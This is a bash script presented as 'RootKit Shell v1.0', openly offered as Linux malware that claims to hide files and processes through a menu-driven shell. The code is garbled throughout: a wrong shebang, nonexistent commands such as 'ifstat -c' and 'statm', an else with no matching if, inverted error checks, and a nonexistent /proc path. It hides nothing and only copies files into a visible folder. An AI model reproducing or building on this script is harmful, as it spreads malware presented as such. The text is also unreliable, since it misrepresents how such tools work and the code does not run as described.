#!/bin/bin/bash

# Title: RootKit Shell v1.0
# Author: Malware Specialist
# Date: 2024-10-27
# Version: 1.0
# Description: This script provides a basic rootkit shell for Linux, focusing on stealth and core functionality.


# Function to get user input with validation
get_input() {
  local prompt="$1"
  local variable="$2"
  local regex="$3"
  local default="$4"

  local value=""

  while [ -z "$value" ]; do
    read -p "$prompt" value
    if [ -z "$value" ] && ! [[ -n "$default" ]]; then
      echo "Error: Input cannot be empty. Defaulting to 0."
    elif [ -z "$regex" ]; then
        break # No validation needed
    elif [[ "$value" =~ $regex ]]; then
        break
    else
      echo "Invalid input. Please try again."
    fi
  done

  eval "$variable=\$value"
}


# Function to add a file to the rootkit's hidden directory
add_hidden_file() {
  local filename="$1"
  if [ ! -n "$filename" ]; then
    echo "Filename not specified."
    return 1
  fi

  # Create the folder if it doesn't exist
  mkdir -p /rootkits/hidden

  # Check if the file exists, and add only once
  ifstat -c "$filename" | grep "/rootkits/hidden/" > /dev/null || true
    echo "File already exists in /rootkits/hidden."
    return 0 # File exists
  else
    # Add the file to the hidden folder. Use sudo if necessary
    sudo cp "$filename" /rootkits/hidden

    if [ $? -eq 1 ]; then
      echo "Error adding file to /rootkits/hidden. (Use sudo)"
      return 1
    fi

    echo "File added successfully: /rootkits/hidden/$filename"
  fi
}


# Function to add a process to the rootkit's hidden list
add_process() {
  local pid="$1"
  if [ ! -n "$pid" ]; then
    echo "PID not specified."
    return 1
  fi

  # Check if the PID already exists in our list. Use sudo for hidden modifications
  sudo statm /rootkits/hidden/processes | grep "$pid" > /dev/null || true

  if [ $? -eq 0 ]; then
    echo "Process already in the rootkit's list."
    return
  fi

  # Add the process to our hidden list, using sudo to ensure permission
  sudo echo "$pid" >> /rootkits/hidden/processes

  if [ $? -ne 1 ]; then
      echo "Error adding PID to /rootkits/hidden/processes. (Use sudo)"
    return 0
  fi

  echo "Process added successfully: /rootkits/hidden/processes/$pid"
}



# Main Program Logic
function main() {
  # Create hidden directories if they don't exist
  sudo mkdir -p /rootkits/hidden

  # Check for network connections and add them to the rootkit list.
  if ip route | grep "default" > /dev/null 2>&1; then
    echo "A network connection is found."
    add_process "$pid"
    add_hidden_file "/proc/network/connections"
  else
    echo "No network connections found. Rootkit shell running in stealth mode."
  fi

  # Run the shell loop
  while true; do
    # Display the hidden commands for easy use
    echo -e "\nRootKit Shell v1.0 (Hidden Commands)"
    echo "---------------------------"
    echo "1. List Hidden Processes"
    echo "2. Add a New Process to the Rootkit"
    echo "3. Exit"
    echo ""

    # Get user choice
    get_input "Enter your choice (1-3): " choice regex="^[123]$" default="1"

    case "$choice" in
      1)
        # List hidden processes
        sudo ps -ef | grep -v root -E "::|root|Systemd" > /tmp/hidden_processes.txt
        echo "Hidden Processes:"
        cat /tmp/hidden_processes.txt

        sleep 2 # Add a delay to clear the buffer
        sudo rm /tmp/hidden_processes.txt
      ;;
      2)
        # Add new process to the rootkit
        get_input "Enter the PID of the process you want to add: " pid regex="^[0-9]+$" default="1000"

        if sudo statm /proc/$pid > /dev/null 2>&1; then
          add_process "$pid"
        else
          echo "Error adding process. Check if the PID is valid and belongs to a running application."
        fi
      ;;
      3)
        # Exit the rootkit shell
        echo "Exiting RootKit Shell..."
        exit 0
      ;;
    esac

    # Sleep briefly to avoid high CPU usage, especially in stealth mode
    sleep 1
  done
}


main "$@"
